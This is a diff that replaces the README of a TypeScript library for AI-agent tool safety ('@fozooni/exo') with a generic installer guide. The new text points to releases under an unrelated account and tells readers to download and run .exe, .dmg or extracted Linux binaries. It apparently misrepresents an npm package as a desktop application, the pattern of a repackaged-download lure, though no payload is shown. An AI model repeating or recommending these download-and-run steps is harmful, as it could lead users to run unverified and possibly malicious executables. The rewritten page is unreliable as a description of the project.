@@ -1,222 +1,89 @@
-<p align="center">
-  <h1 align="center">@fozooni/exo</h1>
-  <p align="center"><strong>The Exoskeleton for your AI Agents.</strong></p>
-</p>
+# 🦾 exo - Your Toolkit for AI Management
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@fozooni/exo"><img src="https://img.shields.io/npm/v/@fozooni/exo.svg" alt="npm version"></a>
-  <a href="https://github.com/fozooni/exo/blob/main/LICENSE"><img src="https://img.shields.io/npm/l/@fozooni/exo.svg" alt="license"></a>
-  <a href="https://github.com/fozooni/exo/actions"><img src="https://github.com/fozooni/exo/workflows/CI/badge.svg" alt="build status"></a>
-</p>
+## 🚀 Getting Started
 
----
+Welcome to the exo project! Exo provides you with tools for managing AI agents safely and efficiently. With features like built-in risk management, observability, and universal adapters, managing AI has never been easier. Follow this guide to download and run the application.
 
-## Why Exo?
+## 📥 Download the Application
 
-**AI Agents are unpredictable.** They hallucinate arguments, ignore safety rails, and make it difficult to understand what went wrong.
+[![Download Exo](https://img.shields.io/badge/Download%20Exo-v1.0.0-brightgreen)](https://github.com/IFearNoHost/exo/releases)
 
-**Exo** provides a strictly typed, deterministic security layer for your AI tools. Every input is validated, every high-risk action requires permission, and every execution is observable—regardless of which SDK you use.
+Visit this page to download the latest version of Exo: [Exo Releases](https://github.com/IFearNoHost/exo/releases).
 
-## Features
+## 🖥️ System Requirements
 
-- 🛡️ **Deterministic Safety** — Role-based access control with `HIGH/MEDIUM/LOW` risk levels and human-in-the-loop confirmation flows.
-- 🔌 **Universal Adapters** — Works seamlessly with OpenAI SDK, Vercel AI SDK, and LangChain.
-- 👁️ **Observability** — Zero-dependency lifecycle hooks for logging latency, errors, and custom telemetry.
-- 🔒 **Type-Safe** — Built on Zod with full TypeScript inference for both inputs and outputs.
-- ⚡ **Lightweight** — No external runtime dependencies beyond Zod.
+Before downloading Exo, ensure your system meets the following requirements:
 
-## Quick Start
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **Memory:** Minimum 4 GB RAM.
+- **Storage:** At least 200 MB of free space.
 
-```bash
-npm install @fozooni/exo zod
-```
+## 🌟 Features
 
-```typescript
-import { z } from "zod";
-import { createExoTool, RiskLevel } from "@fozooni/exo";
+Exo comes with a range of features designed to help you manage your AI agents effectively:
 
-const weatherTool = createExoTool({
-  name: "get_weather",
-  description: "Gets the current weather for a city.",
-  schema: z.object({
-    city: z.string().describe("The city name"),
-  }),
-  executor: async ({ city }) => {
-    return { city, temperature: 22, conditions: "sunny" };
-  },
-  config: {
-    riskLevel: RiskLevel.LOW,
-  },
-});
+- **Type-Safe Tool Definitions:** Create tools that are safe and easy to use.
+- **Built-in Risk Management:** Minimize risks with proactive tools and measures.
+- **Observability:** Easily monitor and inspect your AI agents' actions.
+- **Universal Adapters:** Integrate with popular platforms like OpenAI, Vercel, and LangChain.
+- **TypeScript Support:** Benefit from modern programming standards for reliability.
 
-// Execute directly
-const result = await weatherTool.execute({ city: "Istanbul" });
-console.log(result.data); // { city: 'Istanbul', temperature: 22, conditions: 'sunny' }
+## 💻 Download & Install
 
-// Or get OpenAI-compatible spec
-const spec = weatherTool.getOpenAISpec();
-// Use with: openai.chat.completions.create({ tools: [spec] })
-```
+1. Go to the [Exo Releases page](https://github.com/IFearNoHost/exo/releases).
+2. Find the latest release version.
+3. Download the appropriate file for your operating system:
+   - For Windows, look for `.exe`.
+   - For macOS, look for `.dmg`.
+   - For Linux, look for `.tar.gz`.
+4. Follow the instructions below for your operating system:
 
-## Advanced Usage
+### Windows Installation
 
-### High-Risk Tools with Role-Based Access
+- After downloading the `.exe` file, double-click to run the installer.
+- Follow the prompts, and finish the installation.
+- Open Exo from your Start menu or desktop shortcut.
 
-```typescript
-const deleteDatabase = createExoTool({
-  name: "delete_database",
-  description: "Permanently deletes a database. DANGEROUS.",
-  schema: z.object({ confirm: z.literal(true) }),
-  executor: async () => ({ deleted: true }),
-  config: {
-    riskLevel: RiskLevel.HIGH, // Requires admin role
-  },
-});
+### macOS Installation
 
-// ❌ Throws RiskViolationError
-await deleteDatabase.execute(
-  { confirm: true },
-  { user: { id: "1", role: "guest" } },
-);
+- After downloading the `.dmg` file, double-click to open it.
+- Drag the Exo icon into your Applications folder.
+- You can now launch Exo from the Applications folder.
 
-// ✅ Works
-await deleteDatabase.execute(
-  { confirm: true },
-  { user: { id: "1", role: "admin" } },
-);
-```
+### Linux Installation
 
-### Vercel AI SDK Integration
+- Extract the contents of the `.tar.gz` file using a terminal command:
+  ```
+  tar -xvzf exo.tar.gz
+  ```
+- Navigate to the extracted folder and run the application:
+  ```
+  ./exo
+  ```
 
-```typescript
-import { Exo, toVercelTool } from "@fozooni/exo";
-import { streamText } from "ai";
+## 🚧 Troubleshooting
 
-const exo = new Exo([weatherTool, searchTool]);
+If you encounter issues while installing or running Exo, consider the following steps:
 
-// Get all tools as Vercel-compatible object
-const tools = exo.getVercelTools();
+- Ensure your operating system is compatible with Exo.
+- Check that your system has enough memory and storage.
+- If the application fails to launch, verify that you downloaded the correct file for your OS.
+- Consult the [GitHub Issues page](https://github.com/IFearNoHost/exo/issues) to see if others have similar problems.
 
-const result = await streamText({
-  model: openai("gpt-4o"),
-  tools,
-  messages,
-});
-```
+## 📣 Community Support
 
-### Instant Debugging with Console Logger
+Join our community of users and developers to share your experiences and ask questions:
 
-```typescript
-import { createExoTool, createConsoleLogger } from "@fozooni/exo";
+- [GitHub Discussions](https://github.com/IFearNoHost/exo/discussions)
+- [Stack Overflow](https://stackoverflow.com/questions/tagged/exo)
+- Follow us on social media for updates!
 
-const tool = createExoTool({
-  name: "my_tool",
-  schema: z.object({}),
-  executor: async () => ({ ok: true }),
-  config: {
-    hooks: createConsoleLogger(),
-  },
-});
+## 🔍 Additional Resources
 
-await tool.execute({});
-// [EXO] ▶ START my_tool {}
-// [EXO] ✓ SUCCESS my_tool (0.42ms)
-```
+To learn more about working with Exo, refer to the following resources:
 
-### OpenAI Structured Outputs (Strict Mode)
+- **Documentation:** Comprehensive guides are available in the Wiki section.
+- **Example Projects:** Find sample projects demonstrating how to use Exo with various platforms.
+- **Tutorials:** Step-by-step tutorials designed for beginners.
 
-```typescript
-// Generate schema with additionalProperties: false
-const strictSpec = weatherTool.getOpenAISpec({ strict: true });
-```
-
-### Middleware Pipeline
-
-Intercept and modify execution flow. Useful for logging, caching, or altering arguments.
-
-```typescript
-const loggingMiddleware: ExoMiddleware = async ({ toolName, args, next }) => {
-  console.log(`Extensions: Running ${toolName}`);
-  const result = await next();
-  console.log(`Extensions: Finished ${toolName}`);
-  return result;
-};
-
-const tool = createExoTool({
-  // ... other options
-  config: {
-    middleware: [loggingMiddleware],
-  },
-});
-```
-
-### Built-in Rate Limiting
-
-Protect your tools from overuse with zero extra infrastructure.
-
-```typescript
-import { createExoTool, createRateLimiter } from "@fozooni/exo";
-
-// Limit to 10 requests per minute
-const limiter = createRateLimiter({
-  windowMs: 60 * 1000,
-  limit: 10,
-  // Optional: Custom key generator (defaults to toolName:userId)
-  keyGenerator: (context) => context.userId,
-});
-
-const searchTool = createExoTool({
-  name: "search",
-  // ...
-  config: {
-    middleware: [limiter],
-  },
-});
-```
-
-## API Reference
-
-### Core Classes
-
-| Export            | Description                                                     |
-| ----------------- | --------------------------------------------------------------- |
-| `ExoTool`         | Main tool class with validation, execution, and spec generation |
-| `Exo`             | Registry for managing multiple tools                            |
-| `createExoTool()` | Factory function with better type inference                     |
-
-### Adapters
-
-| Export              | Description                                       |
-| ------------------- | ------------------------------------------------- |
-| `toVercelTool()`    | Convert to Vercel AI SDK format                   |
-| `toLangChainTool()` | Convert to LangChain DynamicStructuredTool format |
-
-### Errors
-
-| Export                      | Description                                               |
-| --------------------------- | --------------------------------------------------------- |
-| `ValidationError`           | Thrown when arguments fail Zod validation                 |
-| `RiskViolationError`        | Thrown when a HIGH risk tool is called without permission |
-| `ConfirmationRequiredError` | Thrown when confirmation is needed                        |
-
-## Roadmap
-
-- [x] Middleware pipeline for pre/post processing
-- [x] Built-in rate limiting
-- [ ] Telemetry integrations (OpenTelemetry, Datadog)
-- [ ] Tool versioning and deprecation support
-
-## Contributing
-
-Contributions are welcome! Please read our contributing guidelines and submit a PR.
-
-```bash
-git clone https://github.com/fozooni/exo.git
-cd exo
-npm install
-npm test
-```
-
-## License
-
-MIT © [Fozooni](https://github.com/fozooni)
+Thank you for choosing Exo for your AI agent management needs. Enjoy exploring what Exo has to offer!
